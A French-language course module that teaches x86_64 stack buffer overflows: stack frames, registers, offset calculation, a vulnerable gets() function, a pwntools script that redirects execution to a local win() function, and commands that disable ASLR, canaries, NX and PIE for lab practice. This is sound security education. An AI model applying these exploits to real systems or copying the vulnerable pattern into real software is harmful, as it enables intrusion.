# Cours : Stack Overflow (Débordement de Pile)

## 🎯 Objectif du Module
Comprendre **en profondeur** le fonctionnement de la pile (Stack), comment une fonction est appelée, et comment exploiter un débordement de buffer pour détourner le flux d'exécution.

---

## 1. Prérequis : La Notation Hexadécimale (Rappel)

Avant de plonger dans les adresses mémoire, assurons-nous que l'hexadécimal est clair.

### 1.1 Pourquoi l'Hexadécimal ?
En mémoire, tout est organisé en **octets** (8 bits). Un octet peut contenir 256 valeurs (0 à 255).
En hexadécimal, **2 chiffres = 1 octet exactement**.

| Décimal | Hexadécimal | Binaire    |
|---------|-------------|------------|
| 0       | 0x00        | 0000 0000  |
| 8       | 0x08        | 0000 1000  |
| 16      | 0x10        | 0001 0000  |
| 255     | 0xFF        | 1111 1111  |

### 1.2 Calcul d'Adresses
```
0x7ffe08 - 0x7ffe00 = 0x08 = 8 en décimal
```

**Pourquoi voit-on souvent des sauts de 8 octets ?**
- Sur un système **64-bits** (x86_64), une adresse mémoire fait 64 bits, soit **8 octets**.
- Un pointeur ou un registre occupe donc 8 octets.
- Les adresses sont souvent alignées sur des multiples de 8 pour l'efficacité du CPU.

---

## 2. La Pile (Stack) : Concept Fondamental

### 2.1 Qu'est-ce que la Pile ?
La **Pile** est une zone de mémoire qui sert à stocker :
- Les **variables locales** des fonctions.
- Les **adresses de retour** (où revenir après l'appel d'une fonction).
- Les **registres sauvegardés** (pour restaurer le contexte).

**Analogie :** Une pile d'assiettes.
- On ajoute une assiette **sur le dessus** (Push).
- On retire une assiette **du dessus** (Pop).
- On ne peut pas retirer l'assiette du milieu sans tout casser.

### 2.2 Direction de Croissance
**Point crucial :** La pile **grandit vers le bas** (vers les adresses plus petites).

```
Adresse Haute (ex: 0x7ffffffff000)
       ↓
       ↓  [ Pile grandit vers le bas ]
       ↓
Adresse Basse (ex: 0x7fffff000000)
```

**Pourquoi c'est important ?**
- Quand on déclare une variable locale, la pile "descend" (RSP diminue).
- Quand une fonction se termine, la pile "remonte" (RSP augmente).

### 2.3 D'où Sortent les Adresses Type `0x7ffe...` ?
Sur Linux 64-bits, l'espace d'adressage est organisé ainsi :

```
0xFFFFFFFFFFFFFFFF  ┌─────────────────────┐
                    │  Noyau (Kernel)     │  (Inaccessible par l'utilisateur)
0xFFFF800000000000  ├─────────────────────┤
                    │  Trou (Non mappé)   │
0x7FFFFFFFFFFF      ├─────────────────────┤
                    │  Stack (Pile)       │  ← Les adresses 0x7fff... sont ici
0x7FFFF7A00000      ├─────────────────────┤
                    │  Bibliothèques (.so)│  (libc, etc.)
0x555555554000      ├─────────────────────┤
                    │  Heap (Tas)         │  (malloc)
0x555555554000      ├─────────────────────┤
                    │  .data / .bss       │  (Variables globales)
0x400000            ├─────────────────────┤
                    │  .text (Code)       │  (Instructions du programme)
0x000000000000      └─────────────────────┘
```

**Les adresses de la pile commencent donc par `0x7f...`** car c'est la zone haute de l'espace utilisateur.

---

## 3. Les Registres (Les Variables du Processeur)

Le processeur ne travaille pas directement avec la mémoire RAM pour chaque opération. Il utilise des **registres** (mémoire ultra-rapide intégrée).

### 3.1 Registres Clés en x86_64

| Registre | Nom Complet          | Rôle                                                                 |
|----------|----------------------|----------------------------------------------------------------------|
| **RSP**  | Stack Pointer        | Pointe vers le **sommet** actuel de la pile (la dernière valeur).   |
| **RBP**  | Base Pointer         | Point de **repère fixe** pour la fonction en cours.                 |
| **RIP**  | Instruction Pointer  | Pointe vers la **prochaine instruction** à exécuter. **CRITIQUE**.  |
| RAX      | Accumulator          | Souvent utilisé pour les valeurs de retour.                          |
| RDI, RSI | Arguments            | Premiers arguments des fonctions (Linux).                            |

### 3.2 Le Registre RIP : La Cible Ultime
**RIP** (Instruction Pointer) contient l'adresse de la prochaine instruction.
- Si on contrôle RIP, on contrôle le programme.
- En exploitation, le but est souvent d'**écraser l'adresse de retour** pour modifier RIP.

---

## 4. La Stack Frame (Cadre de Pile)

Quand une fonction est appelée, le processeur crée un **cadre de pile** (Stack Frame) pour stocker :
1. Les arguments de la fonction.
2. L'adresse de retour (où revenir après la fonction).
3. L'ancien RBP (pour restaurer le contexte).
4. Les variables locales.

### 4.1 Schéma Complet d'une Stack Frame

```
┌────────────────────────────────────────────────────────────────────┐
│                        PILE (Stack)                                │
│                   (Adresses décroissantes ↓)                       │
└────────────────────────────────────────────────────────────────────┘

Adresse Haute
(0x7fffffffe030)  ┌──────────────────────────┐
                  │  Arguments passés        │  (Si plus de 6 arguments)
(0x7fffffffe028)  ├──────────────────────────┤
                  │  ...                     │
(0x7fffffffe020)  ├──────────────────────────┤
                  │  Adresse de Retour (RET) │  ← **CIBLE DE L'ATTAQUE**
                  │  (8 octets)              │    (Écrasée pour détourner RIP)
(0x7fffffffe018)  ├──────────────────────────┤
                  │  Saved RBP               │  ← Ancien pointeur de base
                  │  (8 octets)              │    (Sauvegardé pour restauration)
(0x7fffffffe010)  ├──────────────────────────┤  ← RBP pointe ici
                  │                          │
                  │  Variables Locales       │  ← Notre buffer[64] par exemple
                  │  (buffer[64])            │
                  │                          │
(0x7fffffffdfd0)  ├──────────────────────────┤  ← RSP pointe ici (sommet)
Adresse Basse
```

### 4.2 Explication Détaillée

**1) Variables Locales (Buffer)**
- Déclarées en premier dans la fonction.
- Stockées en bas de la Stack Frame.
- Exemple : `char buffer[64]` occupe 64 octets.

**2) Saved RBP (8 octets)**
- Quand on appelle une fonction, l'ancien RBP est sauvegardé.
- Permet de restaurer le contexte de la fonction appelante.

**3) Adresse de Retour (8 octets)**
- **C'EST LA CLÉ DE L'EXPLOITATION.**
- Contient l'adresse où revenir après la fonction.
- Quand la fonction fait `return`, le processeur :
  1. Lit cette adresse.
  2. La copie dans RIP.
  3. Saute à cette adresse.

---

## 5. Le Buffer Overflow (Débordement de Buffer)

### 5.1 Code Vulnérable
```c
void vulnerable() {
    char buffer[64];  // Buffer de 64 octets
    gets(buffer);     // DANGEREUX : Pas de vérification de taille !
}
```

**Problème :** `gets()` ne vérifie pas la taille. Si on entre 100 octets, elle les écrit quand même.

### 5.2 Visualisation de l'Exploit

**État Normal (Input : "AAAA")**
```
0x...e018  [ Adresse de Retour ]  ← Intacte
0x...e010  [ Saved RBP        ]
0x...dfd0  [ "AAAA\0"         ]  ← buffer[64]
           [ (reste vide)     ]
```

**État Exploité (Input : 80 octets de "A")**
```
0x...e018  [ 0x4141414141414141 ]  ← ÉCRASÉ ! ("AAAAAAAA")
0x...e010  [ 0x4141414141414141 ]  ← Saved RBP écrasé
0x...dfd0  [ "AAAA..." (64x A) ]  ← Buffer rempli + débordement
```

**Résultat :** Quand `vulnerable()` fait `return`, le processeur lit `0x41414141...` comme adresse de retour, saute à cette adresse (invalide), et plante (Segmentation Fault).

---

## 6. Calcul de l'Offset (Décalage)

Pour exploiter un buffer overflow, il faut savoir **exactement** combien d'octets écrire avant d'atteindre l'adresse de retour.

### 6.1 Formule Générale
```
Offset = Taille du Buffer + Taille de Saved RBP
       = 64 + 8
       = 72 octets
```

### 6.2 Construction du Payload
```
Payload = [Padding (72 octets)] + [Nouvelle Adresse de Retour (8 octets)]
```

**Exemple :**
```python
padding = b"A" * 72
new_ret = p64(0x4011d6)  # Adresse de la fonction win()
payload = padding + new_ret
```

### 6.3 Pourquoi 8 Octets pour RBP ?
Sur x86_64, les registres font **64 bits**, soit **8 octets**.
- RBP est un registre 64-bits.
- Donc Saved RBP occupe 8 octets.
- L'adresse de retour aussi (un pointeur) occupe 8 octets.

---

## 7. Exploitation Réelle

### 7.1 Trouver l'Adresse de la Fonction Cible
**Avec objdump :**
```bash
objdump -d program | grep "<win>"
```
Sortie :
```
00000000004011d6 <win>:
```

**Avec gdb :**
```bash
gdb ./program
(gdb) print &win
$1 = (void (*)()) 0x4011d6
```

### 7.2 Script d'Exploitation (Python)
```python
from pwn import *

# Adresse de la fonction win() (trouvée avec objdump)
win_addr = 0x4011d6

# Construction du payload
payload = b"A" * 72           # Remplir buffer + saved RBP
payload += p64(win_addr)      # Écraser l'adresse de retour

# Envoi
p = process('./program')
p.sendline(payload)
p.interactive()
```

---

## 8. Les Protections Modernes

### 8.1 Stack Canaries (Canaris)
Un **canari** est une valeur aléatoire placée entre le buffer et l'adresse de retour.
- Si le canari est modifié, le programme s'arrête.
- Détecte les débordements de buffer.

**Désactiver :** `gcc -fno-stack-protector`

### 8.2 ASLR (Address Space Layout Randomization)
**Randomise** les adresses à chaque exécution.
- L'adresse de la pile change.
- L'adresse de la libc change.
- Rend l'exploitation plus difficile (mais pas impossible).

**Désactiver :** `echo 0 | sudo tee /proc/sys/kernel/randomize_va_space`

### 8.3 DEP / NX (Data Execution Prevention / No-eXecute)
Empêche l'exécution de code sur la pile.
- Impossible d'exécuter du shellcode placé dans le buffer.
- Contourné par **ROP** (Return-Oriented Programming).

**Désactiver :** `gcc -z execstack`

### 8.4 PIE (Position Independent Executable)
Randomise l'adresse du code lui-même.
- L'adresse de `win()` change à chaque exécution.
- Plus difficile à exploiter.

**Désactiver :** `gcc -no-pie`

---

## 9. Glossaire des Termes Techniques

| Terme               | Définition                                                                 |
|---------------------|---------------------------------------------------------------------------|
| **Stack**           | Zone mémoire pour variables locales et adresses de retour.               |
| **Buffer**          | Tableau (souvent `char[]`) pouvant déborder.                             |
| **Overflow**        | Écriture au-delà de la taille allouée.                                   |
| **Return Address**  | Adresse où revenir après une fonction (`RET`).                           |
| **RIP**             | Registre contenant l'adresse de la prochaine instruction.                |
| **RSP**             | Registre pointant vers le sommet de la pile.                             |
| **RBP**             | Registre servant de point de repère pour la Stack Frame.                 |
| **Offset**          | Nombre d'octets entre le début du buffer et l'adresse de retour.         |
| **Payload**         | Données malveillantes envoyées pour exploiter une vulnérabilité.         |
| **Segfault**        | Plantage causé par un accès mémoire invalide.                            |
| **Canary**          | Valeur de garde pour détecter les débordements.                          |
| **ASLR**            | Randomisation des adresses mémoire.                                      |
| **DEP/NX**          | Interdiction d'exécuter du code sur la pile.                             |
| **PIE**             | Randomisation de l'adresse du code.                                      |

---

## 10. Checklist de Compréhension

Avant de passer au module suivant, vous devez pouvoir répondre :

- [ ] Qu'est-ce qu'une Stack Frame ?
- [ ] Pourquoi la pile grandit vers le bas (adresses décroissantes) ?
- [ ] Quelle est la différence entre RSP et RBP ?
- [ ] Combien d'octets occupe une adresse de retour sur x86_64 ?
- [ ] Comment calculer l'offset pour atteindre l'adresse de retour ?
- [ ] Que se passe-t-il quand on écrase l'adresse de retour avec `0x41414141` ?
- [ ] Quelles sont les 4 protections modernes contre les buffer overflows ?
- [ ] Pourquoi `gets()` est-il dangereux ?

---

## 11. Application Red Team

### 11.1 Cas Réels d'Exploitation
Le **Stack Buffer Overflow** a été la base de milliers de vulnérabilités :
- **Morris Worm (1988)** : Premier ver Internet (exploitait `gets()` dans `fingerd`).
- **Code Red (2001)** : Ver qui a infecté 350 000 serveurs Windows.
- **Slammer (2003)** : Ver SQL Server (débordement dans un buffer UDP).

### 11.2 Exploitation Moderne
Aujourd'hui, les protections (ASLR, DEP, Canaries) sont activées par défaut.
L'exploitation nécessite des techniques avancées :
- **ROP (Return-Oriented Programming)** : Chaîner des morceaux de code existants.
- **Leak d'adresse** : Contourner ASLR en révélant une adresse.
- **Heap Exploitation** : Cibler le tas au lieu de la pile.

---

## 12. Exercices Pratiques

Consultez le fichier `exercice.txt` pour :
1. Exploiter un buffer overflow simple.
2. Calculer des offsets.
3. Bypasser des protections.

**Compilez en mode vulnérable :**
```bash
gcc example.c -o program -fno-stack-protector -no-pie -z execstack
```

**Déboguer avec gdb :**
```bash
gdb ./program
(gdb) run < payload.txt
(gdb) info registers rip
```

---

**Prochaine étape :** Module `09_heap_exploitation` (Use-After-Free, Double Free).

---

⚠️ **AVERTISSEMENT LÉGAL**
L'exploitation de vulnérabilités sur des systèmes sans autorisation explicite est **illégale** et passible de poursuites pénales. Ces techniques sont strictement éducatives et doivent être pratiquées uniquement sur des environnements contrôlés (VMs personnelles, CTF).

